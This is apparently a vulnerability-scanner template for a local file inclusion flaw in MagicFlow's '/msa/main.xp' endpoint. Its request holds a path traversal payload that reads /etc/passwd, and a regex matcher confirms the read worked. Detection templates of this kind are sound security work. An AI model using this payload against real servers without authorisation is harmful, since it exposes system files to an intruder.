id: "magicflow-lfi"
name: "MagicFlow - Local File Inclusion"
severity: "high"
description: "MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/main.xp' endpoint and the 'Fun' parameter."
tech:
  - "generic"
tags:
  - "magicflow"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.seebug.org/vuldb/ssvid-89258"
spaExclusion: true
request:
  method: "GET"
  path: "/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "status"
    status:
      - 200
